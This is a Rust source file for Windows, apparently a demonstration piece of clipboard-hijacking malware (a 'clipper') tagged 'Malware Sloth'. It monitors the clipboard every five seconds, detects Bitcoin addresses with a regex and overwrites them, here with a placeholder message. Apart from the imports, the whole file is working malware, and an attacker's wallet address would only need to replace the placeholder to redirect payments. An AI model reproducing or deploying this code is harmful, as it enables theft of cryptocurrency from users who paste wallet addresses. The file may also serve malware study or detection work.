use winapi::um::winuser::{OpenClipboard, CloseClipboard, GetClipboardData, SetClipboardData, EmptyClipboard, CF_TEXT};
use std::ptr::null_mut;
use std::{thread, ffi::CString, ffi::CStr};
use regex::Regex;
use std::time::Duration;

fn read_clipboard() -> Option<String> {
    unsafe {
        if OpenClipboard(null_mut()) != 0 {
            let handle = GetClipboardData(CF_TEXT);
            if !handle.is_null() {
                let c_str = CStr::from_ptr(handle as *const i8);
                let contents = c_str.to_string_lossy().into_owned();
                CloseClipboard();
                return Some(contents);
            }
            CloseClipboard();
        }
        None
    }
}

fn write_clipboard(data: &str) -> bool {
    unsafe {
        if OpenClipboard(null_mut()) != 0 {
            EmptyClipboard();
            let c_str = CString::new(data).unwrap();
            let ptr = c_str.into_raw();
            if !SetClipboardData(CF_TEXT, ptr as *mut _).is_null() {
                CloseClipboard();
                return true;
            }
            CloseClipboard();
        }
        false
    }
}

fn main() {
    let btc_regex = Regex::new(r"(1[a-km-zA-HJ-NP-Z1-9]{25,34})|(3[a-km-zA-HJ-NP-Z1-9]{25,34})|(bc1[a-z0-9]{39,59})").unwrap();
    let mut last_clipboard_content = String::new();

    loop {
        if let Some(contents) = read_clipboard() {
            // Check if clipboard content has changed
            if contents != last_clipboard_content {
                println!("Clipboard changed.");
                last_clipboard_content = contents.clone();

                // Check for BTC wallet address and replace clipboard content if found
                if btc_regex.is_match(&contents) {
                    println!("BTC Wallet Address Found.");
                    if write_clipboard("Malware Sloth was here.") {
                        println!("Clipboard content replaced with placeholder message.");
                    } else {
                        println!("Failed to replace clipboard content.");
                    }
                } else {
                    println!("No BTC Wallet Address found.");
                }
            }
        }

        // Pause for 5 seconds before checking again
        thread::sleep(Duration::from_secs(5));
    }
}